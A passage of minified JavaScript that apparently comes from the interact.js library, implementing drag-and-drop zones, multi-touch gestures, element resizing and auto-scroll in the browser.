      }
      function wt(s) {
        var r,
          l = Bo(s);
        if (!Z.isIOS7 && l) {
          var c = {
            x:
              (r = (r = C(s)) || te).scrollX ||
              r.document.documentElement.scrollLeft,
            y: r.scrollY || r.document.documentElement.scrollTop,
          };
          (l.left += c.x), (l.right += c.x), (l.top += c.y), (l.bottom += c.y);
        }
        return l;
      }
      function Un(s) {
        for (var r = []; s; ) r.push(s), (s = et(s));
        return r;
      }
      function ho(s) {
        return !!M.string(s) && (Oe.document.querySelector(s), !0);
      }
      function ae(s, r) {
        for (var l in r) s[l] = r[l];
        return s;
      }
      function $t(s, r, l) {
        return "parent" === s ? et(l) : "self" === s ? r.getRect(l) : ue(l, s);
      }
      function en(s, r, l, c) {
        var d = s;
        return (
          M.string(d)
            ? (d = $t(d, r, l))
            : M.func(d) && (d = d.apply(void 0, c)),
          M.element(d) && (d = wt(d)),
          d
        );
      }
      function wn(s) {
        return s && { x: "x" in s ? s.x : s.left, y: "y" in s ? s.y : s.top };
      }
      function _(s) {
        return (
          !s ||
            ("x" in s && "y" in s) ||
            (((s = ae({}, s)).x = s.left || 0),
            (s.y = s.top || 0),
            (s.width = s.width || (s.right || 0) - s.x),
            (s.height = s.height || (s.bottom || 0) - s.y)),
          s
        );
      }
      function S(s, r, l) {
        s.left && (r.left += l.x),
          s.right && (r.right += l.x),
          s.top && (r.top += l.y),
          s.bottom && (r.bottom += l.y),
          (r.width = r.right - r.left),
          (r.height = r.bottom - r.top);
      }
      function R(s, r, l) {
        var c = l && s.options[l];
        return (
          wn(en((c && c.origin) || s.options.origin, s, r, [s && r])) || {
            x: 0,
            y: 0,
          }
        );
      }
      function F(s, r) {
        var l =
            arguments.length > 2 && void 0 !== arguments[2]
              ? arguments[2]
              : function (A) {
                  return !0;
                },
          c = arguments.length > 3 ? arguments[3] : void 0;
        if (
          ((c = c || {}),
          M.string(s) && -1 !== s.search(" ") && (s = j(s)),
          M.array(s))
        )
          return (
            s.forEach(function (A) {
              return F(A, r, l, c);
            }),
            c
          );
        if ((M.object(s) && ((r = s), (s = "")), M.func(r) && l(s)))
          (c[s] = c[s] || []), c[s].push(r);
        else if (M.array(r))
          for (var d = 0, h = r; d < h.length; d++) {
            var g = h[d];
            F(s, g, l, c);
          }
        else if (M.object(r))
          for (var m in r)
            F(
              j(m).map(function (A) {
                return "".concat(s).concat(A);
              }),
              r[m],
              l,
              c
            );
        return c;
      }
      function j(s) {
        return s.trim().split(/ +/);
      }
      var Q = function (s, r) {
          return Math.sqrt(s * s + r * r);
        },
        K = ["webkit", "moz"];
      function V(s, r) {
        s.__set || (s.__set = {});
        var l = function (d) {
          if (
            K.some(function (h) {
              return 0 === d.indexOf(h);
            })
          )
            return 1;
          "function" != typeof s[d] &&
            "__set" !== d &&
            Object.defineProperty(s, d, {
              get: function () {
                return d in s.__set ? s.__set[d] : (s.__set[d] = r[d]);
              },
              set: function (h) {
                s.__set[d] = h;
              },
              configurable: !0,
            });
        };
        for (var c in r) l(c);
        return s;
      }
      function X(s, r) {
        (s.page = s.page || {}),
          (s.page.x = r.page.x),
          (s.page.y = r.page.y),
          (s.client = s.client || {}),
          (s.client.x = r.client.x),
          (s.client.y = r.client.y),
          (s.timeStamp = r.timeStamp);
      }
      function z(s) {
        (s.page.x = 0), (s.page.y = 0), (s.client.x = 0), (s.client.y = 0);
      }
      function oe(s) {
        return s instanceof Oe.Event || s instanceof Oe.Touch;
      }
      function de(s, r, l) {
        return (
          (s = s || "page"),
          ((l = l || {}).x = r[s + "X"]),
          (l.y = r[s + "Y"]),
          l
        );
      }
      function le(s, r) {
        return (
          (r = r || { x: 0, y: 0 }),
          Z.isOperaMobile && oe(s)
            ? (de("screen", s, r),
              (r.x += window.scrollX),
              (r.y += window.scrollY))
            : de("page", s, r),
          r
        );
      }
      function he(s) {
        return M.number(s.pointerId) ? s.pointerId : s.identifier;
      }
      function Te(s, r, l) {
        var d,
          h,
          c = r.length > 1 ? Be(r) : r[0];
        le(c, s.page),
          (d = c),
          (h = (h = s.client) || {}),
          Z.isOperaMobile && oe(d) ? de("screen", d, h) : de("client", d, h),
          (s.timeStamp = l);
      }
      function Fe(s) {
        var r = [];
        return (
          M.array(s)
            ? ((r[0] = s[0]), (r[1] = s[1]))
            : "touchend" === s.type
            ? 1 === s.touches.length
              ? ((r[0] = s.touches[0]), (r[1] = s.changedTouches[0]))
              : 0 === s.touches.length &&
                ((r[0] = s.changedTouches[0]), (r[1] = s.changedTouches[1]))
            : ((r[0] = s.touches[0]), (r[1] = s.touches[1])),
          r
        );
      }
      function Be(s) {
        for (
          var r = {
              pageX: 0,
              pageY: 0,
              clientX: 0,
              clientY: 0,
              screenX: 0,
              screenY: 0,
            },
            l = 0;
          l < s.length;
          l++
        ) {
          var c = s[l];
          for (var d in r) r[d] += c[d];
        }
        for (var h in r) r[h] /= s.length;
        return r;
      }
      function Xe(s) {
        if (!s.length) return null;
        var r = Fe(s),
          l = Math.min(r[0].pageX, r[1].pageX),
          c = Math.min(r[0].pageY, r[1].pageY),
          d = Math.max(r[0].pageX, r[1].pageX),
          h = Math.max(r[0].pageY, r[1].pageY);
        return {
          x: l,
          y: c,
          left: l,
          top: c,
          right: d,
          bottom: h,
          width: d - l,
          height: h - c,
        };
      }
      function ct(s, r) {
        var l = r + "X",
          c = r + "Y",
          d = Fe(s),
          h = d[0][l] - d[1][l],
          g = d[0][c] - d[1][c];
        return Q(h, g);
      }
      function Yt(s, r) {
        var l = r + "X",
          c = r + "Y",
          d = Fe(s),
          h = d[1][l] - d[0][l],
          g = d[1][c] - d[0][c];
        return (180 * Math.atan2(g, h)) / Math.PI;
      }
      function Jo(s) {
        return M.string(s.pointerType)
          ? s.pointerType
          : M.number(s.pointerType)
          ? [void 0, void 0, "touch", "pen", "mouse"][s.pointerType]
          : /touch/.test(s.type || "") || s instanceof Oe.Touch
          ? "touch"
          : "mouse";
      }
      function An(s) {
        var r = M.func(s.composedPath) ? s.composedPath() : s.path;
        return [Si(r ? r[0] : s.target), Si(s.currentTarget)];
      }
      var Hn = (function () {
        function s(r) {
          a(this, s),
            (this.immediatePropagationStopped = !1),
            (this.propagationStopped = !1),
            (this._interaction = r);
        }
        return (
          f(s, [
            { key: "preventDefault", value: function () {} },
            {
              key: "stopPropagation",
              value: function () {
                this.propagationStopped = !0;
              },
            },
            {
              key: "stopImmediatePropagation",
              value: function () {
                this.immediatePropagationStopped = this.propagationStopped = !0;
              },
            },
          ]),
          s
        );
      })();
      Object.defineProperty(Hn.prototype, "interaction", {
        get: function () {
          return this._interaction._proxy;
        },
        set: function () {},
      });
      var st = function (s, r) {
          for (var l = 0; l < r.length; l++) {
            var c = r[l];
            s.push(c);
          }
          return s;
        },
        At = function (s) {
          return st([], s);
        },
        bn = function (s, r) {
          for (var l = 0; l < s.length; l++) if (r(s[l], l, s)) return l;
          return -1;
        },
        zo = function (s, r) {
          return s[bn(s, r)];
        },
        po = (function (s) {
          v(l, s);
          var r = k(l);
          function l(c, d, h) {
            var g;
            a(this, l),
              ((g = r.call(this, d._interaction)).dropzone = void 0),
              (g.dragEvent = void 0),
              (g.relatedTarget = void 0),
              (g.draggable = void 0),
              (g.propagationStopped = !1),
              (g.immediatePropagationStopped = !1);
            var m = "dragleave" === h ? c.prev : c.cur,
              A = m.element,
              P = m.dropzone;
            return (
              (g.type = h),
              (g.target = A),
              (g.currentTarget = A),
              (g.dropzone = P),
              (g.dragEvent = d),
              (g.relatedTarget = d.target),
              (g.draggable = d.interactable),
              (g.timeStamp = d.timeStamp),
              g
            );
          }
          return (
            f(l, [
              {
                key: "reject",
                value: function () {
                  var c = this,
                    d = this._interaction.dropState;
                  if (
                    "dropactivate" === this.type ||
                    (this.dropzone &&
                      d.cur.dropzone === this.dropzone &&
                      d.cur.element === this.target)
                  )
                    if (
                      ((d.prev.dropzone = this.dropzone),
                      (d.prev.element = this.target),
                      (d.rejected = !0),
                      (d.events.enter = null),
                      this.stopImmediatePropagation(),
                      "dropactivate" === this.type)
                    ) {
                      var h = d.activeDrops,
                        g = bn(h, function (A) {
                          var P = A.dropzone,
                            b = A.element;
                          return P === c.dropzone && b === c.target;
                        });
                      d.activeDrops.splice(g, 1);
                      var m = new l(d, this.dragEvent, "dropdeactivate");
                      (m.dropzone = this.dropzone),
                        (m.target = this.target),
                        this.dropzone.fire(m);
                    } else
                      this.dropzone.fire(new l(d, this.dragEvent, "dragleave"));
                },
              },
              { key: "preventDefault", value: function () {} },
              {
                key: "stopPropagation",
                value: function () {
                  this.propagationStopped = !0;
                },
              },
              {
                key: "stopImmediatePropagation",
                value: function () {
                  this.immediatePropagationStopped = this.propagationStopped =
                    !0;
                },
              },
            ]),
            l
          );
        })(Hn);
      function xl(s, r) {
        for (var l = 0, c = s.slice(); l < c.length; l++) {
          var d = c[l],
            h = d.dropzone,
            g = d.element;
          (r.dropzone = h),
            (r.target = g),
            h.fire(r),
            (r.propagationStopped = r.immediatePropagationStopped = !1);
        }
      }
      function as(s, r) {
        for (
          var l = (function (h, g) {
              for (
                var m = [], A = 0, P = h.interactables.list;
                A < P.length;
                A++
              ) {
                var b = P[A];
                if (b.options.drop.enabled) {
                  var T = b.options.drop.accept;
                  if (
                    !(
                      (M.element(T) && T !== g) ||
                      (M.string(T) && !vt(g, T)) ||
                      (M.func(T) && !T({ dropzone: b, draggableElement: g }))
                    )
                  )
                    for (var O = 0, J = b.getAllElements(); O < J.length; O++) {
                      var N = J[O];
                      N !== g &&
                        m.push({ dropzone: b, element: N, rect: b.getRect(N) });
                    }
                }
              }
              return m;
            })(s, r),
            c = 0;
          c < l.length;
          c++
        ) {
          var d = l[c];
          d.rect = d.dropzone.getRect(d.element);
        }
        return l;
      }
      function Pl(s, r, l) {
        for (
          var c = s.dropState,
            d = s.interactable,
            h = s.element,
            g = [],
            m = 0,
            A = c.activeDrops;
          m < A.length;
          m++
        ) {
          var P = A[m],
            b = P.dropzone,
            T = P.element,
            O = P.rect,
            J = b.dropCheck(r, l, d, h, T, O);
          g.push(J ? T : null);
        }
        var N = (function (H) {
          for (var re, ne, ce, be = [], ke = 0; ke < H.length; ke++) {
            var ge = H[ke],
              _e = H[re];
            if (ge && ke !== re)
              if (_e) {
                var dt = Wt(ge),
                  He = Wt(_e);
                if (dt !== ge.ownerDocument)
                  if (He !== ge.ownerDocument)
                    if (dt !== He) {
                      be = be.length ? be : yt(_e);
                      var bt = void 0;
                      if (
                        _e instanceof Oe.HTMLElement &&
                        ge instanceof Oe.SVGElement &&
                        !(ge instanceof Oe.SVGSVGElement)
                      ) {
                        if (ge === He) continue;
                        bt = ge.ownerSVGElement;
                      } else bt = ge;
                      for (
                        var Gt = yt(bt, _e.ownerDocument), on = 0;
                        Gt[on] && Gt[on] === be[on];

                      )
                        on++;
                      var Wi = [Gt[on - 1], Gt[on], be[on]];
                      if (Wi[0])
                        for (var Xo = Wi[0].lastChild; Xo; ) {
                          if (Xo === Wi[1]) {
                            (re = ke), (be = Gt);
                            break;
                          }
                          if (Xo === Wi[2]) break;
                          Xo = Xo.previousSibling;
                        }
                    } else
                      (ce = _e),
                        (parseInt(
                          C((ne = ge)).getComputedStyle(ne).zIndex,
                          10
                        ) || 0) >=
                          (parseInt(C(ce).getComputedStyle(ce).zIndex, 10) ||
                            0) && (re = ke);
                  else re = ke;
              } else re = ke;
          }
          return re;
        })(g);
        return c.activeDrops[N] || null;
      }
      function ls(s, r, l) {
        var c = s.dropState,
          d = {
            enter: null,
            leave: null,
            activate: null,
            deactivate: null,
            move: null,
            drop: null,
          };
        return (
          "dragstart" === l.type &&
            ((d.activate = new po(c, l, "dropactivate")),
            (d.activate.target = null),
            (d.activate.dropzone = null)),
          "dragend" === l.type &&
            ((d.deactivate = new po(c, l, "dropdeactivate")),
            (d.deactivate.target = null),
            (d.deactivate.dropzone = null)),
          c.rejected ||
            (c.cur.element !== c.prev.element &&
              (c.prev.dropzone &&
                ((d.leave = new po(c, l, "dragleave")),
                (l.dragLeave = d.leave.target = c.prev.element),
                (l.prevDropzone = d.leave.dropzone = c.prev.dropzone)),
              c.cur.dropzone &&
                ((d.enter = new po(c, l, "dragenter")),
                (l.dragEnter = c.cur.element),
                (l.dropzone = c.cur.dropzone))),
            "dragend" === l.type &&
              c.cur.dropzone &&
              ((d.drop = new po(c, l, "drop")),
              (l.dropzone = c.cur.dropzone),
              (l.relatedTarget = c.cur.element)),
            "dragmove" === l.type &&
              c.cur.dropzone &&
              ((d.move = new po(c, l, "dropmove")),
              (l.dropzone = c.cur.dropzone))),
          d
        );
      }
      function cs(s, r) {
        var l = s.dropState,
          c = l.activeDrops,
          d = l.cur,
          h = l.prev;
        r.leave && h.dropzone.fire(r.leave),
          r.enter && d.dropzone.fire(r.enter),
          r.move && d.dropzone.fire(r.move),
          r.drop && d.dropzone.fire(r.drop),
          r.deactivate && xl(c, r.deactivate),
          (l.prev.dropzone = d.dropzone),
          (l.prev.element = d.element);
      }
      function Ml(s, r) {
        var l = s.interaction,
          c = s.iEvent,
          d = s.event;
        if ("dragmove" === c.type || "dragend" === c.type) {
          var h = l.dropState;
          r.dynamicDrop && (h.activeDrops = as(r, l.element));
          var g = c,
            m = Pl(l, g, d);
          (h.rejected =
            h.rejected &&
            !!m &&
            m.dropzone === h.cur.dropzone &&
            m.element === h.cur.element),
            (h.cur.dropzone = m && m.dropzone),
            (h.cur.element = m && m.element),
            (h.events = ls(l, 0, g));
        }
      }
      var Sl = {
          id: "actions/drop",
          install: function (s) {
            var r = s.actions,
              l = s.interactStatic,
              c = s.Interactable,
              d = s.defaults;
            s.usePlugin(Pe),
              (c.prototype.dropzone = function (h) {
                return (function (g, m) {
                  if (M.object(m)) {
                    if (
                      ((g.options.drop.enabled = !1 !== m.enabled), m.listeners)
                    ) {
                      var A = F(m.listeners),
                        P = Object.keys(A).reduce(function (T, O) {
                          return (
                            (T[
                              /^(enter|leave)/.test(O)
                                ? "drag".concat(O)
                                : /^(activate|deactivate|move)/.test(O)
                                ? "drop".concat(O)
                                : O
                            ] = A[O]),
                            T
                          );
                        }, {}),
                        b = g.options.drop.listeners;
                      b && g.off(b), g.on(P), (g.options.drop.listeners = P);
                    }
                    return (
                      M.func(m.ondrop) && g.on("drop", m.ondrop),
                      M.func(m.ondropactivate) &&
                        g.on("dropactivate", m.ondropactivate),
                      M.func(m.ondropdeactivate) &&
                        g.on("dropdeactivate", m.ondropdeactivate),
                      M.func(m.ondragenter) && g.on("dragenter", m.ondragenter),
                      M.func(m.ondragleave) && g.on("dragleave", m.ondragleave),
                      M.func(m.ondropmove) && g.on("dropmove", m.ondropmove),
                      /^(pointer|center)$/.test(m.overlap)
                        ? (g.options.drop.overlap = m.overlap)
                        : M.number(m.overlap) &&
                          (g.options.drop.overlap = Math.max(
                            Math.min(1, m.overlap),
                            0
                          )),
                      "accept" in m && (g.options.drop.accept = m.accept),
                      "checker" in m && (g.options.drop.checker = m.checker),
                      g
                    );
                  }
                  return M.bool(m)
                    ? ((g.options.drop.enabled = m), g)
                    : g.options.drop;
                })(this, h);
              }),
              (c.prototype.dropCheck = function (h, g, m, A, P, b) {
                return (function (T, O, J, N, H, re, ne) {
                  var ce = !1;
                  if (!(ne = ne || T.getRect(re)))
                    return (
                      !!T.options.drop.checker &&
                      T.options.drop.checker(O, J, ce, T, re, N, H)
                    );
                  var be = T.options.drop.overlap;
                  if ("pointer" === be) {
                    var ke = R(N, H, "drag"),
                      ge = le(O);
                    (ge.x += ke.x), (ge.y += ke.y);
                    var _e = ge.x > ne.left && ge.x < ne.right,
                      dt = ge.y > ne.top && ge.y < ne.bottom;
                    ce = _e && dt;
                  }
                  var He = N.getRect(H);
                  if (He && "center" === be) {
                    var bt = He.left + He.width / 2,
                      Gt = He.top + He.height / 2;
                    ce =
                      bt >= ne.left &&
                      bt <= ne.right &&
                      Gt >= ne.top &&
                      Gt <= ne.bottom;
                  }
                  return (
                    He &&
                      M.number(be) &&
                      (ce =
                        (Math.max(
                          0,
                          Math.min(ne.right, He.right) -
                            Math.max(ne.left, He.left)
                        ) *
                          Math.max(
                            0,
                            Math.min(ne.bottom, He.bottom) -
                              Math.max(ne.top, He.top)
                          )) /
                          (He.width * He.height) >=
                        be),
                    T.options.drop.checker &&
                      (ce = T.options.drop.checker(O, J, ce, T, re, N, H)),
                    ce
                  );
                })(this, h, g, m, A, P, b);
              }),
              (l.dynamicDrop = function (h) {
                return M.bool(h) ? ((s.dynamicDrop = h), l) : s.dynamicDrop;
              }),
              ae(r.phaselessTypes, {
                dragenter: !0,
                dragleave: !0,
                dropactivate: !0,
                dropdeactivate: !0,
                dropmove: !0,
                drop: !0,
              }),
              (r.methodDict.drop = "dropzone"),
              (s.dynamicDrop = !1),
              (d.actions.drop = Sl.defaults);
          },
          listeners: {
            "interactions:before-action-start": function (s) {
              var r = s.interaction;
              "drag" === r.prepared.name &&
                (r.dropState = {
                  cur: { dropzone: null, element: null },
                  prev: { dropzone: null, element: null },
                  rejected: null,
                  events: null,
                  activeDrops: [],
                });
            },
            "interactions:after-action-start": function (s, r) {
              var l = s.interaction,
                c = (s.event, s.iEvent);
              if ("drag" === l.prepared.name) {
                var d = l.dropState;
                (d.activeDrops = []),
                  (d.events = {}),
                  (d.activeDrops = as(r, l.element)),
                  (d.events = ls(l, 0, c)),
                  d.events.activate &&
                    (xl(d.activeDrops, d.events.activate),
                    r.fire("actions/drop:start", {
                      interaction: l,
                      dragEvent: c,
                    }));
              }
            },
            "interactions:action-move": Ml,
            "interactions:after-action-move": function (s, r) {
              var l = s.interaction,
                c = s.iEvent;
              if ("drag" === l.prepared.name) {
                var d = l.dropState;
                cs(l, d.events),
                  r.fire("actions/drop:move", { interaction: l, dragEvent: c }),
                  (d.events = {});
              }
            },
            "interactions:action-end": function (s, r) {
              if ("drag" === s.interaction.prepared.name) {
                var l = s.interaction,
                  c = s.iEvent;
                Ml(s, r),
                  cs(l, l.dropState.events),
                  r.fire("actions/drop:end", { interaction: l, dragEvent: c });
              }
            },
            "interactions:stop": function (s) {
              var r = s.interaction;
              if ("drag" === r.prepared.name) {
                var l = r.dropState;
                l &&
                  ((l.activeDrops = null),
                  (l.events = null),
                  (l.cur.dropzone = null),
                  (l.cur.element = null),
                  (l.prev.dropzone = null),
                  (l.prev.element = null),
                  (l.rejected = !1));
              }
            },
          },
          getActiveDrops: as,
          getDrop: Pl,
          getDropEvents: ls,
          fireDropEvents: cs,
          filterEventType: function (s) {
            return 0 === s.search("drag") || 0 === s.search("drop");
          },
          defaults: { enabled: !1, accept: null, overlap: "pointer" },
        },
        vh = Sl;
      function us(s) {
        var r = s.interaction,
          l = s.iEvent,
          c = s.phase;
        if ("gesture" === r.prepared.name) {
          var d = r.pointers.map(function (P) {
              return P.pointer;
            }),
            h = "start" === c,
            g = "end" === c,
            m = r.interactable.options.deltaSource;
          if (((l.touches = [d[0], d[1]]), h))
            (l.distance = ct(d, m)),
              (l.box = Xe(d)),
              (l.scale = 1),
              (l.ds = 0),
              (l.angle = Yt(d, m)),
              (l.da = 0),
              (r.gesture.startDistance = l.distance),
              (r.gesture.startAngle = l.angle);
          else if (g || r.pointers.length < 2) {
            var A = r.prevEvent;
            (l.distance = A.distance),
              (l.box = A.box),
              (l.scale = A.scale),
              (l.ds = 0),
              (l.angle = A.angle),
              (l.da = 0);
          } else
            (l.distance = ct(d, m)),
              (l.box = Xe(d)),
              (l.scale = l.distance / r.gesture.startDistance),
              (l.angle = Yt(d, m)),
              (l.ds = l.scale - r.gesture.scale),
              (l.da = l.angle - r.gesture.angle);
          (r.gesture.distance = l.distance),
            (r.gesture.angle = l.angle),
            M.number(l.scale) &&
              l.scale !== 1 / 0 &&
              !isNaN(l.scale) &&
              (r.gesture.scale = l.scale);
        }
      }
      var ds = {
          id: "actions/gesture",
          before: ["actions/drag", "actions/resize"],
          install: function (s) {
            var r = s.actions,
              l = s.Interactable,
              c = s.defaults;
            (l.prototype.gesturable = function (d) {
              return M.object(d)
                ? ((this.options.gesture.enabled = !1 !== d.enabled),
                  this.setPerAction("gesture", d),
                  this.setOnEvents("gesture", d),
                  this)
                : M.bool(d)
                ? ((this.options.gesture.enabled = d), this)
                : this.options.gesture;
            }),
              (r.map.gesture = ds),
              (r.methodDict.gesture = "gesturable"),
              (c.actions.gesture = ds.defaults);
          },
          listeners: {
            "interactions:action-start": us,
            "interactions:action-move": us,
            "interactions:action-end": us,
            "interactions:new": function (s) {
              s.interaction.gesture = {
                angle: 0,
                distance: 0,
                scale: 1,
                startAngle: 0,
                startDistance: 0,
              };
            },
            "auto-start:check": function (s) {
              if (!(s.interaction.pointers.length < 2)) {
                var r = s.interactable.options.gesture;
                if (r && r.enabled) return (s.action = { name: "gesture" }), !1;
              }
            },
          },
          defaults: {},
          getCursor: function () {
            return "";
          },
          filterEventType: function (s) {
            return 0 === s.search("gesture");
          },
        },
        yh = ds;
      function wh(s, r, l, c, d, h, g) {
        if (!r) return !1;
        if (!0 === r) {
          var m = M.number(h.width) ? h.width : h.right - h.left,
            A = M.number(h.height) ? h.height : h.bottom - h.top;
          if (
            ((g = Math.min(
              g,
              Math.abs(("left" === s || "right" === s ? m : A) / 2)
            )),
            m < 0 &&
              ("left" === s ? (s = "right") : "right" === s && (s = "left")),
            A < 0 &&
              ("top" === s ? (s = "bottom") : "bottom" === s && (s = "top")),
            "left" === s)
          ) {
            var P = m >= 0 ? h.left : h.right;
            return l.x < P + g;
          }
          if ("top" === s) {
            var b = A >= 0 ? h.top : h.bottom;
            return l.y < b + g;
          }
          if ("right" === s) return l.x > (m >= 0 ? h.right : h.left) - g;
          if ("bottom" === s) return l.y > (A >= 0 ? h.bottom : h.top) - g;
        }
        return !!M.element(c) && (M.element(r) ? r === c : fo(c, r, d));
      }
      function Tl(s) {
        var r = s.iEvent,
          l = s.interaction;
        if ("resize" === l.prepared.name && l.resizeAxes) {
          var c = r;
          l.interactable.options.resize.square
            ? ("y" === l.resizeAxes
                ? (c.delta.x = c.delta.y)
                : (c.delta.y = c.delta.x),
              (c.axes = "xy"))
            : ((c.axes = l.resizeAxes),
              "x" === l.resizeAxes
                ? (c.delta.y = 0)
                : "y" === l.resizeAxes && (c.delta.x = 0));
        }
      }
      var tn,
        Vn,
        nn = {
          id: "actions/resize",
          before: ["actions/drag"],
          install: function (s) {
            var r = s.actions,
              l = s.browser,
              c = s.Interactable,
              d = s.defaults;
            (nn.cursors = l.isIe9
              ? {
                  x: "e-resize",
                  y: "s-resize",
                  xy: "se-resize",
                  top: "n-resize",
                  left: "w-resize",
                  bottom: "s-resize",
                  right: "e-resize",
                  topleft: "se-resize",
                  bottomright: "se-resize",
                  topright: "ne-resize",
                  bottomleft: "ne-resize",
                }
              : {
                  x: "ew-resize",
                  y: "ns-resize",
                  xy: "nwse-resize",
                  top: "ns-resize",
                  left: "ew-resize",
                  bottom: "ns-resize",
                  right: "ew-resize",
                  topleft: "nwse-resize",
                  bottomright: "nwse-resize",
                  topright: "nesw-resize",
                  bottomleft: "nesw-resize",
                }),
              (nn.defaultMargin =
                l.supportsTouch || l.supportsPointerEvent ? 20 : 10),
              (c.prototype.resizable = function (h) {
                return (
                  (g = this),
                  (m = h),
                  (A = s),
                  M.object(m)
                    ? ((g.options.resize.enabled = !1 !== m.enabled),
                      g.setPerAction("resize", m),
                      g.setOnEvents("resize", m),
                      M.string(m.axis) && /^x$|^y$|^xy$/.test(m.axis)
                        ? (g.options.resize.axis = m.axis)
                        : null === m.axis &&
                          (g.options.resize.axis =
                            A.defaults.actions.resize.axis),
                      M.bool(m.preserveAspectRatio)
                        ? (g.options.resize.preserveAspectRatio =
                            m.preserveAspectRatio)
                        : M.bool(m.square) &&
                          (g.options.resize.square = m.square),
                      g)
                    : M.bool(m)
                    ? ((g.options.resize.enabled = m), g)
                    : g.options.resize
                );
                var g, m, A;
              }),
              (r.map.resize = nn),
              (r.methodDict.resize = "resizable"),
              (d.actions.resize = nn.defaults);
          },
          listeners: {
            "interactions:new": function (s) {
              s.interaction.resizeAxes = "xy";
            },
            "interactions:action-start": function (s) {
              (function (r) {
                var l = r.iEvent,
                  c = r.interaction;
                if ("resize" === c.prepared.name && c.prepared.edges) {
                  var d = l,
                    h = c.rect;
                  (c._rects = {
                    start: ae({}, h),
                    corrected: ae({}, h),
                    previous: ae({}, h),
                    delta: {
                      left: 0,
                      right: 0,
                      width: 0,
                      top: 0,
                      bottom: 0,
                      height: 0,
                    },
                  }),
                    (d.edges = c.prepared.edges),
                    (d.rect = c._rects.corrected),
                    (d.deltaRect = c._rects.delta);
                }
              })(s),
                Tl(s);
            },
            "interactions:action-move": function (s) {
              (function (r) {
                var l = r.iEvent,
                  c = r.interaction;
                if ("resize" === c.prepared.name && c.prepared.edges) {
                  var d = l,
                    h = c.interactable.options.resize.invert,
                    g = "reposition" === h || "negate" === h,
                    m = c.rect,
                    A = c._rects,
                    P = A.start,
                    b = A.corrected,
                    T = A.delta,
                    O = A.previous;
                  if ((ae(O, b), g)) {
                    if ((ae(b, m), "reposition" === h)) {
                      if (b.top > b.bottom) {
                        var J = b.top;
                        (b.top = b.bottom), (b.bottom = J);
                      }
                      if (b.left > b.right) {
                        var N = b.left;
                        (b.left = b.right), (b.right = N);
                      }
                    }
                  } else
                    (b.top = Math.min(m.top, P.bottom)),
                      (b.bottom = Math.max(m.bottom, P.top)),
                      (b.left = Math.min(m.left, P.right)),
                      (b.right = Math.max(m.right, P.left));
                  for (var H in ((b.width = b.right - b.left),
                  (b.height = b.bottom - b.top),
                  b))
                    T[H] = b[H] - O[H];
                  (d.edges = c.prepared.edges), (d.rect = b), (d.deltaRect = T);
                }
              })(s),
                Tl(s);
            },
            "interactions:action-end": function (s) {
              var r = s.iEvent,
                l = s.interaction;
              if ("resize" === l.prepared.name && l.prepared.edges) {
                var c = r;
                (c.edges = l.prepared.edges),
                  (c.rect = l._rects.corrected),
                  (c.deltaRect = l._rects.delta);
              }
            },
            "auto-start:check": function (s) {
              var r = s.interaction,
                l = s.interactable,
                c = s.element,
                d = s.rect,
                h = s.buttons;
              if (d) {
                var g = ae({}, r.coords.cur.page),
                  m = l.options.resize;
                if (
                  m &&
                  m.enabled &&
                  (!r.pointerIsDown ||
                    !/mouse|pointer/.test(r.pointerType) ||
                    h & m.mouseButtons)
                ) {
                  if (M.object(m.edges)) {
                    var A = { left: !1, right: !1, top: !1, bottom: !1 };
                    for (var P in A)
                      A[P] = wh(
                        P,
                        m.edges[P],
                        g,
                        r._latestPointer.eventTarget,
                        c,
                        d,
                        m.margin || nn.defaultMargin
                      );
                    (A.left = A.left && !A.right),
                      (A.top = A.top && !A.bottom),
                      (A.left || A.right || A.top || A.bottom) &&
                        (s.action = { name: "resize", edges: A });
                  } else {
                    var b = "y" !== m.axis && g.x > d.right - nn.defaultMargin,
                      T = "x" !== m.axis && g.y > d.bottom - nn.defaultMargin;
                    (b || T) &&
                      (s.action = {
                        name: "resize",
                        axes: (b ? "x" : "") + (T ? "y" : ""),
                      });
                  }
                  return !s.action && void 0;
                }
              }
            },
          },
          defaults: {
            square: !1,
            preserveAspectRatio: !1,
            axis: "xy",
            margin: NaN,
            edges: null,
            invert: "none",
          },
          cursors: null,
          getCursor: function (s) {
            var r = s.edges,
              l = s.axis,
              c = s.name,
              d = nn.cursors,
              h = null;
            if (l) h = d[c + l];
            else if (r) {
              for (
                var g = "", m = 0, A = ["top", "bottom", "left", "right"];
                m < A.length;
                m++
              ) {
                var P = A[m];
                r[P] && (g += P);
              }
              h = d[g];
            }
            return h;
          },
          filterEventType: function (s) {
            return 0 === s.search("resize");
          },
          defaultMargin: null,
        },
        Ah = nn,
        bh = {
          id: "actions",
          install: function (s) {
            s.usePlugin(yh), s.usePlugin(Ah), s.usePlugin(Pe), s.usePlugin(vh);
          },
        },
        kl = 0,
        _n = {
          request: function (s) {
            return tn(s);
          },
          cancel: function (s) {
            return Vn(s);
          },
          init: function (s) {
            if (
              ((tn = s.requestAnimationFrame),
              (Vn = s.cancelAnimationFrame),
              !tn)
            )
              for (
                var r = ["ms", "moz", "webkit", "o"], l = 0;
                l < r.length;
                l++
              ) {
                var c = r[l];
                (tn = s["".concat(c, "RequestAnimationFrame")]),
                  (Vn =
                    s["".concat(c, "CancelAnimationFrame")] ||
                    s["".concat(c, "CancelRequestAnimationFrame")]);
              }
            (tn = tn && tn.bind(s)),
              (Vn = Vn && Vn.bind(s)),
              tn ||
                ((tn = function (d) {
                  var h = Date.now(),
                    g = Math.max(0, 16 - (h - kl)),
                    m = s.setTimeout(function () {
                      d(h + g);
                    }, g);
                  return (kl = h + g), m;
                }),
                (Vn = function (d) {
                  return clearTimeout(d);
                }));
          },
        },
        me = {
          defaults: { enabled: !1, margin: 60, container: null, speed: 300 },
          now: Date.now,
          interaction: null,
          i: 0,
          x: 0,
          y: 0,
          isScrolling: !1,
          prevTime: 0,
          margin: 0,
          speed: 0,
          start: function (s) {
            (me.isScrolling = !0),
              _n.cancel(me.i),
              (s.autoScroll = me),
              (me.interaction = s),
              (me.prevTime = me.now()),
              (me.i = _n.request(me.scroll));
          },
          stop: function () {
            (me.isScrolling = !1),
              me.interaction && (me.interaction.autoScroll = null),
              _n.cancel(me.i);
          },
          scroll: function () {
            var s = me.interaction,
              r = s.interactable,
              l = s.element,
              c = s.prepared.name,
              d = r.options[c].autoScroll,
              h = El(d.container, r, l),
              g = me.now(),
              m = (g - me.prevTime) / 1e3,
              A = d.speed * m;
            if (A >= 1) {
              var P = { x: me.x * A, y: me.y * A };
              if (P.x || P.y) {
                var b = Dl(h);
                M.window(h)
                  ? h.scrollBy(P.x, P.y)
                  : h && ((h.scrollLeft += P.x), (h.scrollTop += P.y));
                var T = Dl(h),
